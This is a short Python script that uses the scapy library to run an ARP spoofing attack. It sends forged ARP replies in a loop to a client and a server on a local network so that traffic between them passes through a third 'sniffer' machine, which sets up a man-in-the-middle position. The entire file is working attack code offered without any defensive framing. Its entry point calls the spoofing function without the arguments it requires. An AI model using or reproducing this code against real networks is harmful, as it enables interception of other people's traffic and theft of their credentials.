import time
from scapy.all import ARP, sendp, Ether, get_if_hwaddr

def run_spoofer(interface, ip_list):
  info = {item['name']: item for item in ip_list}

  # To client (server's MAC -> my MAC)
  arp_to_client = Ether(dst=info['client']['mac']) / ARP(
    op=2,
    pdst=info['client']['ip'],
    hwdst=info['client']['mac'],
    psrc=info['server']['ip'],
    hwsrc=info['sniffer']['mac'],
  )

  # To server
  arp_to_server = Ether(dst=info['server']['mac']) / ARP(
    op=2,
    pdst=info['server']['ip'],
    hwdst=info['server']['mac'],
    psrc=info['client']['ip'],
    hwsrc=info['sniffer']['mac'],
  )

  try:
    while True:
      sendp(arp_to_client, iface=interface, verbose=False)
      sendp(arp_to_server, iface=interface, verbose=False)
      print("[+] Sent spoofed ARP replies")
      time.sleep(2)
  except KeyboardInterrupt:
      print("\n[*] Stopping ARP poisoner.")

if __name__ == "__main__":
   run_spoofer()